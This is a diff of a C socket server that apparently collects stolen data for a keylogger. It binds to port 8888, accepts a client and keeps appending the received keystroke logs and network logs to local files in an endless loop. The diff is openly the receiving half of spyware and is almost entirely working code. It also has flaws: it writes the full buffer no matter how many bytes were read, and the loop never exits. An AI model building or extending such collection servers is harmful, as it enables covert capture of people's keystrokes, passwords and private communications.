@@ -6,13 +6,14 @@
 #include <unistd.h>       // write
 #include <fcntl.h>
 
+#define BUFFER_SIZE 4096
+
 int main()
 {
     // Variables
-    int ssock, csock, addrlen, read_size, ret;
+    int ssock, csock, addrlen, read_size;
     struct sockaddr_in server, client;
-    char rec_buffer[3000];
-    
+    char rec_buffer[BUFFER_SIZE];
     short port = 8888;  //TCP port
     
     // Create a socket. Return value is a file descriptor for the socket.
@@ -26,7 +27,7 @@ int main()
     // Set the server ip address, connection family and port. INADDR_ANY means
     // all the ip addresses of the server can be used to set up connection.
     server.sin_family      = AF_INET;
-    server.sin_addr.s_addr = INADDR_ANY;
+    server.sin_addr.s_addr = inet_addr("127.0.0.1");
     server.sin_port        = htons(port);
     
     // Bind the socket for the connection
@@ -54,32 +55,32 @@ int main()
     printf("Connection accepted\n");
     
     /*** Reading from Client and writing to local files* ***/
-    
-    memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
-    /*Open keylog files for printing*/
-    FILE *keylog_log = fopen("log/keylog_received.txt", "a");
-    /*Receive a keylog file from the client*/
-    if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
-        fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
-    } else {
-        perror("Error receiving keylog log\n");
+    while(1){
+        memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
+        /*Open keylog files for printing*/
+        FILE *keylog_log = fopen("log/keylog_received.txt", "a");
+        /*Receive a keylog file from the client*/
+        if ((read_size = read(csock, &rec_buffer, sizeof(rec_buffer))) > 0) {
+            fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), keylog_log);
+        } else {
+            perror("Error receiving keylog log\n");
+        }
+        fclose(keylog_log);
+        
+        
+        memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
+        /*Open network log file for printing*/
+        FILE *network_log = fopen("log/network_received.txt", "a");
+        /*Receive network log file*/
+        if ((read_size = read(csock, &rec_buffer, sizeof(rec_buffer))) > 0) {
+            fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
+        } else {
+            perror("Error receiving network log\n");
+        }
+        fclose(network_log);
+        
+        printf("\nLog transfer complete\n");
     }
-    fclose(keylog_log);
-    
-    
-    memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
-    /*Open network log file for printing*/
-    FILE *network_log = fopen("log/network_received.txt", "a");
-    /*Receive network log file*/
-    if ((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
-        fwrite(rec_buffer, sizeof(char), sizeof(rec_buffer), network_log);
-    } else {
-        perror("Error receiving network log\n");
-    }
-    fclose(network_log);
-    
-    memset(rec_buffer, 0, sizeof(rec_buffer));
-    printf("\nLog transfer complete\n");
     
     close(csock);
     close(ssock);
